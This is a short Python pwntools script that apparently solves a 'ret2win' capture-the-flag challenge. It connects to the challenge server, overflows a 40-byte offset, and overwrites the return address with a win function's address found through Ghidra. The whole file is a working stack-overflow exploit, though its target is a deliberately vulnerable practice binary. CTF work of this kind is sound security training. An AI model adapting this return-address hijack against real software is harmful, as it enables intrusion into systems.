#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
io = remote('ret2win-pwn.wanictf.org', 9003)
exe = './chall'
#io = process(exe)
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'


# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

# Got manually through RE on ghidra
win_address = 0x00401369

# padding + win()
payload = flat({
    offset: [
        win_address
    ]
})

io.sendlineafter(b'your input (max. 48 bytes) > ', payload)

io.interactive()